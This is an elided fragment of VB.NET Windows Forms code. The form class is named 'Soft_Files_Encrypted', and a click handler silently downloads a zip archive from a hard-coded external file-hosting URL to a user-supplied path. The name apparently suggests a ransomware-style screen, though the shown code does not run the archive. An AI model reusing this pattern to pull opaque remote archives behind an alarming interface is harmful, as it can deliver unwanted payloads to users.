Imports System.Net
Public Class Soft_Files_Encrypted
    ...
    Private Sub Soft_Files_Encrypted_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Panel7.Hide()
    ...
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        ...
        Panel1.Hide()
        Timer1.Start()
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_1efd0da2dfa240df882c80879fb7d510.zip"), TextBox1.Text)
    End Sub
